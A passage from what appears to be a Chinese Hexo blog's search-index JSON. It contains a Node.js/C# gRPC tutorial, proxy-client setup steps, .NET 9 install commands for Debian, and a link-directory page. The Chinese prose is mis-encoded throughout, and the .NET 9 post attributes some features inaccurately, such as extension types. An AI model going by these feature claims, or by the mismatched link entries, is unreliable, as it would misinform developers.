çš„é€šä¿¡ã€‚å®æ—¶ç›‘æ§ä¸æ§åˆ¶ï¼šgRPCçš„æµå¼APIéå¸¸é€‚åˆç”¨äºå®æ—¶ç›‘æ§å’Œæ§åˆ¶IoTè®¾å¤‡ï¼Œå¦‚æ™ºèƒ½å®¶å±…ç³»ç»Ÿã€å·¥ä¸šè‡ªåŠ¨åŒ–ç­‰åœºæ™¯ã€‚ 9. å¤§æ•°æ®å’Œæœºå™¨å­¦ä¹ æ•°æ®ä¼ è¾“ï¼šåœ¨å¤§æ•°æ®å¤„ç†å’Œæœºå™¨å­¦ä¹ è®­ç»ƒè¿‡ç¨‹ä¸­ï¼ŒgRPCå¯ä»¥ç”¨æ¥é«˜æ•ˆåœ°ä¼ è¾“å¤§é‡æ•°æ®ï¼Œç‰¹åˆ«æ˜¯å½“æ•°æ®éœ€è¦åœ¨ä¸åŒçš„è®¡ç®—èŠ‚ç‚¹ä¹‹é—´ä¼ é€’æ—¶ã€‚æ¨¡å‹æœåŠ¡ï¼šgRPCå¸¸è¢«ç”¨äºæ„å»ºæœºå™¨å­¦ä¹ æ¨¡å‹çš„æœåŠ¡åŒ–æ¥å£ï¼Œå…è®¸å®¢æˆ·ç«¯ä»¥é«˜æ•ˆçš„æ–¹å¼æŸ¥è¯¢æ¨¡å‹é¢„æµ‹ç»“æœã€‚ç»¼ä¸Šæ‰€è¿°ï¼ŒgRPCæ˜¯ä¸€ä¸ªçµæ´»ä¸”å¼ºå¤§çš„é€šä¿¡æ¡†æ¶ï¼Œé€‚ç”¨äºå„ç§éœ€è¦é«˜æ•ˆã€å¯é é€šä¿¡çš„åœºæ™¯ã€‚æ— è®ºæ˜¯æ„å»ºå¤æ‚çš„å¾®æœåŠ¡æ¶æ„ï¼Œè¿˜æ˜¯ç®€å•çš„å®¢æˆ·ç«¯-æœåŠ¡å™¨åº”ç”¨ï¼ŒgRPCéƒ½èƒ½æä¾›æ˜¾è‘—çš„ä¼˜åŠ¿ã€‚ Node.js gRPC åˆ›å»ºå’Œè°ƒç”¨ gRPC æœåŠ¡ã€‚åŒ…æ‹¬æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å®ç°ã€‚ 1. å®‰è£…å¿…è¦çš„åŒ…åœ¨é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… gRPC ç›¸å…³ä¾èµ–ï¼š 1npm install @grpc/grpc-js @grpc/proto-loader 2. åˆ›å»º proto æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ example.proto å®šä¹‰ gRPC æœåŠ¡å’Œæ¶ˆæ¯ç»“æ„ï¼š proto 12345678910111213syntax = &quot;proto3&quot;;service ExampleService &#123; rpc SayHello (HelloRequest) returns (HelloReply);&#125;message HelloRequest &#123; string name = 1;&#125;message HelloReply &#123; string message = 1;&#125; 3. å®ç° gRPC æœåŠ¡å™¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ server.jsï¼Œå®ç° gRPC æœåŠ¡ï¼š 12345678910111213141516171819202122232425262728293031323334const grpc = require(&#x27;@grpc/grpc-js&#x27;);const protoLoader = require(&#x27;@grpc/proto-loader&#x27;);const path = require(&#x27;path&#x27;);// åŠ è½½ proto æ–‡ä»¶const PROTO_PATH = path.join(__dirname, &#x27;example.proto&#x27;);const packageDefinition = protoLoader.loadSync(PROTO_PATH, &#123; keepCase: true, longs: String, enums: String, defaults: true, oneofs: true,&#125;);const exampleProto = grpc.loadPackageDefinition(packageDefinition);// å®ç° SayHello æ–¹æ³•function sayHello(call, callback) &#123; const name = call.request.name; callback(null, &#123; message: `Hello, $&#123;name&#125;!` &#125;);&#125;// åˆ›å»ºå’Œå¯åŠ¨ gRPC æœåŠ¡å™¨function main() &#123; const server = new grpc.Server(); server.addService(exampleProto.ExampleService.service, &#123; SayHello: sayHello &#125;); const port = &#x27;127.0.0.1:50051&#x27;; server.bindAsync(port, grpc.ServerCredentials.createInsecure(), () =&gt; &#123; console.log(`Server running at $&#123;port&#125;`); // ä¸å†éœ€è¦è°ƒç”¨ server.start() &#125;);&#125;main(); 4. å®ç° gRPC å®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ client.jsï¼Œè°ƒç”¨ gRPC æœåŠ¡ï¼š 12345678910111213141516171819202122232425262728293031const grpc = require(&#x27;@grpc/grpc-js&#x27;);const protoLoader = require(&#x27;@grpc/proto-loader&#x27;);const path = require(&#x27;path&#x27;);// åŠ è½½ proto æ–‡ä»¶const PROTO_PATH = path.join(__dirname, &#x27;example.proto&#x27;);const packageDefinition = protoLoader.loadSync(PROTO_PATH, &#123; keepCase: true, longs: String, enums: String, defaults: true, oneofs: true,&#125;);const exampleProto = grpc.loadPackageDefinition(packageDefinition);// åˆ›å»ºå®¢æˆ·ç«¯å¹¶è°ƒç”¨æœåŠ¡function main() &#123; const client = new exampleProto.ExampleService(&#x27;127.0.0.1:50051&#x27;, grpc.credentials.createInsecure()); const name = &#x27;World&#x27;; client.SayHello(&#123; name &#125;, (error, response) =&gt; &#123; if (error) &#123; console.error(&#x27;Error:&#x27;, error); &#125; else &#123; console.log(&#x27;Server Response:&#x27;, response.message); &#125; &#125;);&#125;main(); 5. è¿è¡Œç¤ºä¾‹å¯åŠ¨æœåŠ¡å™¨ï¼š 1node server.js åœ¨å¦ä¸€ä¸ªç»ˆç«¯çª—å£è¿è¡Œå®¢æˆ·ç«¯ï¼š 1node client.js åœ¨å®¢æˆ·ç«¯ç»ˆç«¯çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š 1Server Response: Hello, World! proto æ–‡ä»¶ï¼šç”¨äºå®šä¹‰æœåŠ¡å’Œæ¶ˆæ¯ç»“æ„ã€‚æœåŠ¡å™¨ï¼šé€šè¿‡ grpc.Server åˆ›å»ºå¹¶å®ç°æœåŠ¡æ–¹æ³•ã€‚å®¢æˆ·ç«¯ï¼šé€šè¿‡ grpc.Client è°ƒç”¨æœåŠ¡å¹¶å¤„ç†å“åº”ã€‚å¯ä»¥åŸºäºæ­¤ç¤ºä¾‹æ‰©å±•è‡ªå·±çš„ gRPC æœåŠ¡åŠŸèƒ½ã€‚ C#ç¼–å†™çš„ gRPC å®¢æˆ·ç«¯1. æ·»åŠ ä¾èµ–åœ¨çš„ C# é¡¹ç›®ä¸­ï¼Œæ·»åŠ ä»¥ä¸‹ NuGet åŒ…ï¼š 1234dotnet add package Grpc.Net.Clientdotnet add package Grpc.Toolsdotnet add package google.protobuf 2. é…ç½® example.protoå°† example.proto æ–‡ä»¶æ·»åŠ åˆ°çš„ C# é¡¹ç›®ä¸­ï¼Œå¹¶ç¼–è¾‘ .csproj æ–‡ä»¶ä»¥ç”Ÿæˆå®¢æˆ·ç«¯ä»£ç ã€‚æ·»åŠ ä»¥ä¸‹å†…å®¹åˆ° èŠ‚ç‚¹ä¸­ï¼š 1234&lt;ItemGroup&gt; &lt;Protobuf Include=&quot;example.proto&quot; GrpcServices=&quot;Client&quot; /&gt;&lt;/ItemGroup&gt; è¿™å°†å‘Šè¯‰ç¼–è¯‘å™¨æ ¹æ® example.proto æ–‡ä»¶ç”Ÿæˆ C# å®¢æˆ·ç«¯ä»£ç ã€‚ 3. ç¼–å†™å®¢æˆ·ç«¯ä»£ç åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ Program.csï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324using Grpc.Net.Client;using Example;// ç¡®ä¿å‘½åç©ºé—´ä¸ example.proto ä¸­çš„ package å®šä¹‰ä¸€è‡´class Program&#123; static async Task Main(string[] args) &#123; // åˆ›å»º gRPC é€šé“ using var channel = GrpcChannel.ForAddress(&quot;http://127.0.0.1:50051&quot;); // åˆ›å»ºå®¢æˆ·ç«¯ var client = new ExampleService.ExampleServiceClient(channel); // è°ƒç”¨æœåŠ¡æ–¹æ³• var request = new HelloRequest &#123; Name = &quot;World&quot; &#125;; var reply = await client.SayHelloAsync(request); // è¾“å‡ºæœåŠ¡å“åº” Console.WriteLine(&quot;Server Response: &quot; + reply.Message); &#125;&#125; è¿è¡Œå®¢æˆ·ç«¯ç¡®ä¿ Node.js gRPC æœåŠ¡å™¨æ­£åœ¨è¿è¡Œã€‚ åœ¨çš„ C# é¡¹ç›®ç›®å½•ä¸­è¿è¡Œï¼š 1dotnet run å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œçœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼š Server Response: Hello, World! Proto æ–‡ä»¶çš„è·¯å¾„é…ç½®ï¼š ç¡®ä¿ example.proto ä¸­çš„ package å®šä¹‰ä¸º Exampleï¼Œå¹¶ä¸ C# å‘½åç©ºé—´ä¸€è‡´ã€‚ ç”Ÿæˆçš„å®¢æˆ·ç«¯ä»£ç ï¼š æ ¹æ® example.protoï¼Œå·¥å…·ä¼šç”Ÿæˆ ExampleServiceClient å’Œ HelloRequest&#x2F;HelloReply ç±»ã€‚åªéœ€è°ƒç”¨è¿™äº›ç±»ä¸æœåŠ¡é€šä¿¡ã€‚ gRPC é€šé“ï¼š ä½¿ç”¨ GrpcChannel.ForAddress åˆ›å»ºä¸€ä¸ªåˆ°æœåŠ¡å™¨çš„è¿æ¥ã€‚ å¼‚æ­¥è°ƒç”¨ï¼š gRPC æ–¹æ³•é€šå¸¸æ˜¯å¼‚æ­¥çš„ï¼Œä½¿ç”¨ await æ¥è°ƒç”¨å®ƒä»¬ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"gRPC","slug":"gRPC","permalink":"https://banjinmei.github.io/tags/gRPC/"}],"author":"mu"},{"title":"Clash V2Ray ClashVerge ç§‘å­¦ä¸Šç½‘ å¯Œå¼º","slug":"Clash-V2RayClashVerge-ç§‘å­¦ä¸Šç½‘-å¯Œå¼º","date":"2024-12-06T15:13:02.000Z","updated":"2024-12-06T15:57:02.293Z","comments":true,"path":"2024/12/06/Clash-V2RayClashVerge-ç§‘å­¦ä¸Šç½‘-å¯Œå¼º/","permalink":"https://banjinmei.github.io/2024/12/06/Clash-V2RayClashVerge-%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%AF%8C%E5%BC%BA/","excerpt":"","text":"Clash androidgithub.com&#x2F;metacubex&#x2F;clashmetaforandroid&#x2F;releases 1.é…ç½® - å³ä¸Šè§’ + urlå¯¼å…¥2.è¾“å…¥url save3.ç‚¹å‡»å·²åœæ­¢ -&gt; åˆ‡æ¢æˆ è¿è¡Œä¸­4.ç‚¹å‡»ä»£ç† é€‰æ‹©èŠ‚ç‚¹ V2Ray wingithub.com&#x2F;2dust&#x2F;v2rayN&#x2F;releases 1.è®¢é˜…åˆ†ç»„ -&gt; è®¢é˜…åˆ†ç»„è®¾ç½® save2.è®¢é˜…åˆ†ç»„ -&gt; æ›´æ–°å…¨éƒ¨è®¢é˜…3.æœåŠ¡å™¨ -&gt; è®¾ä¸ºæ´»åŠ¨æœåŠ¡å™¨ or å³é”®æ‰˜ç›˜ è‡ªåŠ¨ ClashVerge macgithub.com&#x2F;clash-verge-rev&#x2F;clash-verge&#x2F;releases 1.èœå•&gt;è®¢é˜… - æ–°å»º2.åç§° é—´éš” 300min è¾“å…¥è®¢é˜…é“¾æ¥ save3.é€‰ä¸­ åˆ·æ–°4.èœå•&gt;ä»£ç† - å…¨å±€ -èŠ‚ç‚¹ é€‰æ‹©ç»¿è‰²çš„5.èœå•&gt;è®¾ç½® - ç³»ç»Ÿä»£ç† å¼€å…³ ios shadowrocket sing-box","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"ASP.NET Core 9.0","slug":"ASP-NET-Core-9-0","date":"2024-12-05T13:56:25.000Z","updated":"2025-03-16T17:23:40.339Z","comments":true,"path":"2024/12/05/ASP-NET-Core-9-0/","permalink":"https://banjinmei.github.io/2024/12/05/ASP-NET-Core-9-0/","excerpt":"","text":".net9å¼•å…¥äº†æ‰©å±•ç±»å‹ç‰¹æ€§ï¼Œå…è®¸å¼€å‘è€…æ‰©å±•å®ä¾‹æˆå‘˜ã€é™æ€æˆå‘˜ä»¥åŠå±æ€§æˆå‘˜ï¼Œæ‰“ç ´äº†ä»¥å¾€åªèƒ½é€šè¿‡é™æ€ç±»å®šä¹‰æ‰©å±•æ–¹æ³•çš„é™åˆ¶ï¼›params å…³é”®å­—ä¸å†å±€é™äºæ•°ç»„ç±»å‹ï¼Œå¯ä¸å¤šç§é›†åˆç±»å‹ä¸€èµ·ä½¿ç”¨ï¼›æ–°å¢ System.Threading.Lock ç±»å‹ç”¨äºçº¿ç¨‹åŒæ­¥ï¼Œæ”¹è¿›äº†çº¿ç¨‹åŒæ­¥æœºåˆ¶ï¼›å¼‚å¸¸å¤„ç†é€Ÿåº¦å¤§å¹…æå‡ï¼Œç¯è·¯æ€§èƒ½ä¹Ÿæœ‰æ‰€æé«˜ï¼ŒåŠ¨æ€ PGO é™ä½äº†ç±»å‹æ£€æŸ¥æˆæœ¬ï¼ŒRyuJIT ç¼–è¯‘å™¨å†…è”æ›´é€šç”¨çš„æ–¹æ³•ä»¥å‡å°‘æ–¹æ³•è°ƒç”¨å¼€é”€ç­‰.linqæ–°å¢äº† CountBy å’Œ AggregateBy æ–¹æ³•ï¼Œå¯é€šè¿‡é”®è¿›è¡ŒçŠ¶æ€èšåˆï¼Œæ— éœ€é€šè¿‡ GroupBy è¿›è¡Œä¸­é—´åˆ†ç»„ï¼Œæé«˜äº†æ•°æ®æŸ¥è¯¢çš„æ•ˆç‡å’Œçµæ´»æ€§.å¼•å…¥äº† CryptographicOperations ç±»å‹ä¸­çš„æ–°çš„ä¸€æ¬¡æ€§å“ˆå¸Œæ–¹æ³•ï¼Œæ”¯æŒæœ€æ–°çš„åŠ å¯†æ ‡å‡†ï¼Œå¹¶æ–°å¢äº†ä¸€äº›åŠ å¯†ç›¸å…³çš„ APIï¼›å¼ºåŒ–äº†å®‰å…¨æœºåˆ¶ï¼Œå¦‚å¼•å…¥æ›´å¼ºå¤§çš„èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶ï¼Œæ”¯æŒ OAuth 2.0 å’Œ OpenID Connect ç­‰ï¼Œè¿˜é€šè¿‡ AI é©±åŠ¨çš„å®‰å…¨åŠŸèƒ½å®ç°å®æ—¶å¨èƒæ£€æµ‹ Debian 12 å®‰è£….NET 9æ·»åŠ  Microsoft åŒ…ç­¾åå¯†é’¥å’ŒåŒ…å­˜å‚¨åº“ï¼šæ‰“å¼€ç»ˆç«¯ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 123wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.debrm packages-microsoft-prod.deb å®‰è£….NET SDKï¼šå¦‚æœéœ€è¦å¼€å‘.NET åº”ç”¨ç¨‹åºï¼Œå¯å®‰è£….NET SDKï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12sudo apt-get update &amp;&amp; \\sudo apt-get install -y dotnet-sdk-9.0 å®‰è£….NET è¿è¡Œæ—¶ï¼šå¦‚æœåªéœ€è¦è¿è¡Œ.NET åº”ç”¨ç¨‹åºï¼Œå¯å®‰è£….NET è¿è¡Œæ—¶ã€‚å»ºè®®å®‰è£…ASP.NET Core è¿è¡Œæ—¶ï¼Œå› ä¸ºå®ƒåŒ…å«äº†.NET å’ŒASP.NET Core è¿è¡Œæ—¶ï¼Œåœ¨ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12sudo apt-get update &amp;&amp; \\sudo apt-get install -y aspnetcore-runtime-9.0 ä½œä¸ºASP.NET Core è¿è¡Œæ—¶çš„æ›¿ä»£æ–¹æ³•ä¹Ÿå¯ä»¥å®‰è£…ä¸åŒ…å«ASP.NET Core æ”¯æŒçš„.NET è¿è¡Œæ—¶ï¼Œå°†ä¸Šè¿°å‘½ä»¤ä¸­çš„aspnetcore-runtime-9.0æ›¿æ¢ä¸ºdotnet-runtime-9.0ï¼Œå³ï¼š 1sudo apt-get install -y dotnet-runtime-9.0 éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ1dotnet --version old .NET8123sudo apt update sudo apt upgrade -ywget -O ä¸‹è½½å¹¶ä»¥ä¸åŒçš„æ–‡ä»¶åä¿å­˜ æ·»åŠ  Microsoft åŒ…ä»“åº“123wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.debsudo apt update 2 .net81sudo apt install -y dotnet-sdk-8.0 123456789wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.debsudo dpkg -i packages-microsoft-prod.deb# 8 sudo apt-get update; \\ sudo apt-get install -y apt-transport-https &amp;&amp; \\ sudo apt-get update &amp;&amp; \\ sudo apt-get install -y dotnet-sdk-8.0 .NET8å‡çº§.NET9æ‰“å¼€é¡¹ç›®å³é”®å±æ€§ç›®æ ‡æ¡†æ¶.NET 8.0 æ”¹ä¸º9.0nugetupdate","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net9.0","slug":"net9-0","permalink":"https://banjinmei.github.io/tags/net9-0/"}],"author":"mu"},{"title":"Navigation","slug":"Navigation","date":"2024-12-04T11:31:51.000Z","updated":"2025-03-16T17:27:41.097Z","comments":true,"path":"2024/12/04/Navigation/","permalink":"https://banjinmei.github.io/2024/12/04/Navigation/","excerpt":"","text":"Study Tools AI Hexo Fun Game const data = [ { \"category\": \"Study\", \"items\": [ { \"title\": \"web3\", \"url\": \"https://www.hackquest.io/ \", \"img\": \"https://t8.baidu.com/it/u=2123981564,3721828760&fm=217&app=126&size=f242,150&n=0&f=PNG\", \"description\": \"web3 Learn and Grow Careers in Web3.\" }, { \"title\": \"ç”µæŠ¥å¯¼èˆª\", \"url\": \"https://tgdriver.com/ \", \"img\": \"https://tgdriver.com/wp-content/uploads/2023/05/tg-tinypng.png\", \"description\": \"ç”µæŠ¥è€å¸æœº.\" }, { \"title\": \"äººäººéƒ½æ˜¯äº§å“ç»ç†\", \"url\": \"https://www.woshipm.com/\", \"img\": \"https://image.woshipm.com/fp/images/logo.png\", \"description\": \"äº§å“ç»ç†ã€äº§å“çˆ±å¥½è€…å­¦ä¹ äº¤æµå¹³å°\" }, { \"title\": \"Element Plus\", \"url\": \"https://element-plus.org/\", \"img\": \"https://element-plus.org/images/element-plus-logo.svg\", \"description\": \"é¢å‘è®¾è®¡å¸ˆå’Œå¼€å‘è€…çš„ç»„ä»¶åº“ åŸºäºVue 3\" }, { \"title\": \"AMZ123\", \"url\": \"https://www.amz123.com/\", \"img\": \"https://t7.baidu.com/it/u=1062105737,570237901&fm=190&app=131&size=f242,150&n=0&f=JPE\", \"description\": \"AMZ123äºšé©¬é€Šå¯¼èˆªæ˜¯ä¸€å®¶è‡´åŠ›äºæœåŠ¡ä¸­å›½è·¨å¢ƒç”µå•†ä»ä¸šè€…çš„ç»¼åˆå¹³å°\" }, { \"title\": \"nodejs\", \"url\": \"https://nodejs.org/\", \"img\": \"https://nodejs.org/static/logos/nodejsDark.svg\", \"description\": \"Node.jsÂ® æ˜¯ä¸€ä¸ªå…è´¹ã€å¼€æºã€è·¨å¹³å°çš„JavaScriptè¿è¡Œæ—¶ç¯å¢ƒ,\" }, { \"title\": \"phpä¸­æ–‡ç½‘\", \"url\": \"https://www.php.cn/\", \"img\": \"https://www.php.cn/static/images/logo.png\", \"description\": \"php.cn phpä¸­æ–‡ç½‘-æ•™ç¨‹_æ‰‹å†Œ_è§†é¢‘-å…è´¹phpåœ¨çº¿å­¦ä¹ å¹³å°\" }, { \"title\": \"èœé¸Ÿæ•™ç¨‹\", \"url\": \"https://www.runoob.com/\", \"img\": \"https://www.runoob.com/wp-content/themes/runoob/assets/img/runoob-logo.png\", \"description\": \"èœé¸Ÿæ•™ç¨‹ å­¦çš„ä¸ä»…æ˜¯æŠ€æœ¯ï¼Œæ›´æ˜¯æ¢¦æƒ³ï¼\" }, { \"title\": \"å…¨çƒä¸»æœºäº¤æµè®º\", \"url\": \"https://hostloc.com/\", \"img\": \"https://hostloc.com/static/image/common/logo.png\", \"description\": \"vps\" }, { \"title\": \"V2EX\", \"url\": \"https://www.v2ex.com/\", \"img\": \"/images/face.png\", \"description\": \"V2EX åˆ›æ„å·¥ä½œè€…çš„ç¤¾åŒºã€‚è®¨è®ºç¼–ç¨‹ã€è®¾è®¡ã€ç¡¬ä»¶ã€æ¸¸æˆç­‰ä»¤äººæ¿€åŠ¨çš„è¯é¢˜ã€‚\" }, { \"title\": \"LINUX DO\", \"url\": \"https://linux.do/\", \"img\": \"https://linux.do/uploads/default/original/3X/b/4/b4fa45d8b03df61f5d011e173c0adf8497028b16.png\", \"description\": \"LINUX DO - æ–°çš„ç†æƒ³å‹ç¤¾åŒº\" }, { \"title\": \"ç”µé¸­\", \"url\": \"https://eleduck.com/\", \"img\": \"https://static.eleduck.com/_next/static/media/logo.dec76c92.png\", \"description\": \"ç”µé¸­ç¤¾åŒº,ä¸“æ³¨è¿œç¨‹åŠå…¬åŠæ‹›è˜,è¿œç¨‹åŠå…¬ä»ç”µé¸­å¼€å§‹,è¿œç¨‹å·¥ä½œ,è‡ªç”±èŒä¸š,å…¼èŒå¤–åŒ…,åœ¨å®¶å·¥ä½œ,remote working,remotely,freelancer,\" }, { \"title\": \"GitHub\", \"url\": \"https://github.com/\", \"img\": \"https://github.githubassets.com/images/icons/emoji/octocat.png\", \"description\": \"Build software better, together GitHub is where people build software. \" }, { \"title\": \"golang\", \"url\": \"https://golang.google.cn/\", \"img\": \"/images/face.png\", \"description\": \"https://golang.google.cn/\" }, { \"title\": \"CSDN\", \"url\": \"https://www.csdn.net/\", \"img\": \"https://t8.baidu.com/it/u=945984959,3948445137&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"CSDN ä¸­æ–‡ITæŠ€æœ¯äº¤æµå¹³å°,åˆ›å»ºäº1999å¹´,åŒ…å«åŸåˆ›åšå®¢ã€ç²¾å“é—®ç­”ã€èŒä¸šåŸ¹è®­ã€æŠ€æœ¯è®ºå›\" }, { \"title\": \"OSCHINA\", \"url\": \"https://www.oschina.net/\", \"img\": \"https://t8.baidu.com/it/u=2619601293,3923045050&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"OSCHINA - ä¸­æ–‡å¼€æºæŠ€æœ¯äº¤æµç¤¾åŒº\" }, { \"title\": \"åä¸ºå¼€å‘è€…\", \"url\": \"https://developer.apple.com/\", \"img\": \"https://res-static.hc-cdn.cn/cloudbu-site/china/zh-cn/hdhomeportal/logonew.png\", \"description\": \"å¼€å‘è€…,åä¸ºäº‘,HMS,é¸¿è’™,é²²é¹,æ˜‡è…¾,æ•°æ®åº“,AI,5G,äº‘åŸç”Ÿ,äº‘è®¡ç®—,å¤§èµ›,åä¸ºå¼€å‘è€…,åä¸º\" }, { \"title\": \"HarmonyOSå¼€å‘è€…ç¤¾åŒº\", \"url\": \"https://harmonyosdev.csdn.net/\", \"img\": \"https://devpress.csdnimg.cn/041451c94cbd45af95e7dab96007154a.png\", \"description\": \"HarmonyOSå¼€å‘è€…ç¤¾åŒº\" }, { \"title\": \"apple developer\", \"url\": \"https://developer.apple.com/\", \"img\": \"https://developer-rno.apple.com/events/developer-centers/images/discover-programs_2x.jpg\", \"description\": \"apple developer\" }, { \"title\": \"vivodev\", \"url\": \"https://developer.vivo.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png\", \"description\": \"vivo developer,vivoå›½å¤–æ‰‹æœºå•†åº—,vivo appstore,vivoå…¨çƒæ‰‹æœºå•†åŸ\" }, { \"title\": \"AWS Amazon Web Services\", \"url\": \"https://aws.amazon.com/\", \"img\": \"https://a0.awsstatic.com/libra-css/images/logos/aws_smile-header-desktop-en-white_59x35.png\", \"description\": \"AWS äº‘æœåŠ¡-ä¸“ä¸šçš„å¤§æ•°æ®å’Œäº‘è®¡ç®—æœåŠ¡ä»¥åŠäº‘è§£å†³æ–¹æ¡ˆæä¾›å•†\" }, { \"title\": \"é˜¿é‡Œäº‘\", \"url\": \"https://aliyun.com/\", \"img\": \"https://t8.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG\", \"description\": \"ä¸Šäº‘å°±ä¸Šé˜¿é‡Œäº‘ã€‚\" }, { \"title\": \"googledev\", \"url\": \"https://developers.google.com\", \"img\": \"https://t9.baidu.com/it/u=1149675542,2513106999&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"Google for Developers - ä»AIå’Œäº‘åˆ°ç§»åŠ¨å’ŒWeb\" }, { \"title\": \"ThinkPHP\", \"url\": \"https://www.thinkphp.cn/\", \"img\": \"https://doc.topthink.com/lfs/02503b197ad195b8cc5eb97db82d7d0e657ade6c72e780dd8e1994f1ad806452.dat\", \"description\": \"è½»é‡çº§PHPæ¡†æ¶|ä¸“æ³¨WEBåº”ç”¨å¼€å‘18å¹´ Â· ThinkPHP\" }, { \"title\": \"æ˜é‡‘\", \"url\": \"https://juejin.cn/\", \"img\": \"https://lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/e08da34488b114bd4c665ba2fa520a31.svg\", \"description\": \"æ˜é‡‘æ˜¯é¢å‘å…¨çƒä¸­æ–‡å¼€å‘è€…çš„æŠ€æœ¯å†…å®¹åˆ†äº«ä¸äº¤æµå¹³å°\" }, { \"title\": \"hellogithub\", \"url\": \"https://hellogithub.com/\", \"img\": \"https://img.hellogithub.com/logo/logo.png\", \"description\": \"å¼€æº,open source,å¼€æºç¤¾åŒº,å¼€æºé¡¹ç›®\" }, { \"title\": \"BigBear\", \"url\": \"https://bigbearvpn.sodtool.com/\", \"img\": \"https://wiki-bigbearvpn.sodtool.com/images/logo_black.png\", \"description\": \"BigBear\" }, { \"title\": \"mitce\", \"url\": \"https://mitce.com/?language=chinese\", \"img\": \"https://st0.dancf.com/static/02/202306090204-51f4.png\", \"description\": \"æä¾›å®‰å…¨çš„åŠ å¯†ç¶²è·¯ä»£ç†\" }, { \"title\": \"è…¾è®¯äº‘\", \"url\": \"https://cloud.qq.com/\", \"img\": \"https://cloudcache.tencent-cloud.com/qcloud/portal/kit/images/slice/logo.23996906.svg\", \"description\": \"è…¾è®¯äº‘,tencent cloud,äº‘æœåŠ¡å™¨,äº‘ä¸»æœº,CDN,å¯¹è±¡å­˜å‚¨,åŸŸåæ³¨å†Œå¤‡æ¡ˆ,äº‘å­˜å‚¨,äº‘æ•°æ®åº“,äº’è”ç½‘+è§£å†³æ–¹æ¡ˆ,QQäº‘\" }, { \"title\": \"ç­‹æ–—äº‘\", \"url\": \"https://www.jindouyun.cn/\", \"img\": \"https://t7.baidu.com/it/u=1943493154,1028907721&fm=217&app=126&size=f242,150&n=0&f=PNG\", \"description\": \"ç­‹æ–—äº‘ - ç®€å•å¥½ç”¨ã€é«˜æ€§ä»·æ¯”çš„äº‘æœåŠ¡å™¨_äº‘ä¸»æœº\" }, { \"title\": \"åä¸ºäº‘\", \"url\": \"https://cloud.huawei.com/\", \"img\": \"https://id1.cloud.huawei.com/CAS/static_rss/rss_20241031/CAS/vue3/vuebuild/img/cloundLoginLogo.png\", \"description\": \"åä¸ºäº‘ç©ºé—´ï¼Œåä¸ºäº‘æœåŠ¡ï¼Œåä¸ºäº‘ï¼ŒæŸ¥æ‰¾æ‰‹æœºï¼ŒæŸ¥æ‰¾è®¾å¤‡ï¼Œåä¸ºæ‰‹æœºä¸¢äº†ï¼Œè£è€€æ‰‹æœºä¸¢äº†ï¼Œäº‘å¤‡ä»½ï¼Œåä¸ºæ‰‹æœºäº‘æœåŠ¡ï¼Œåä¸ºæ‰‹æœºä¸¢äº†è¿œç¨‹é”å®š\" } ] }, { \"category\": \"Tools\", \"items\": [ { \"title\": \"json\", \"url\": \"https://www.sojson.com/\", \"img\": \"https://t9.baidu.com/it/u=2962407189,358182402&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"jsonæ ¼å¼åŒ–\" }, { \"title\": \"freemp3\", \"url\": \"https://www.qeecc.com/\", \"img\": \"http://www.qeecc.com/images/logo.png\", \"description\": \" freemp3 qm\" }, { \"title\": \"å‹ç¼©å›¾ç‰‡\", \"url\": \"https://www.xunjietupian.com/yasuo/\", \"img\": \"https://www.xunjietupian.com/img/icon/icon_logo.svg\", \"description\": \"åœ¨çº¿å¿«é€Ÿå‹ç¼©å›¾ç‰‡4\" }, { \"title\": \"BTC USD\", \"url\": \"https://www.tradingview.com/symbols/BTCUSD/\", \"img\": \"https://t8.baidu.com/it/u=210671946,991419608&fm=3035&app=3035&size=f242,162&n=0&g=0n&f=JPEG\", \"description\": \" BTC USD â€” Bitcoin Price and Chart â€” TradingView\" }, { \"title\": \"çˆ±ç«™ç½‘\", \"url\": \"https://www.aizhan.com/\", \"img\": \"https://statics.aizhan.com/images/img/logo.png\", \"description\": \"ç«™é•¿å·¥å…·-ç™¾åº¦æƒé‡æ’åæŸ¥è¯¢-ç«™é•¿seoæŸ¥è¯¢ - çˆ±ç«™ç½‘\" }, { 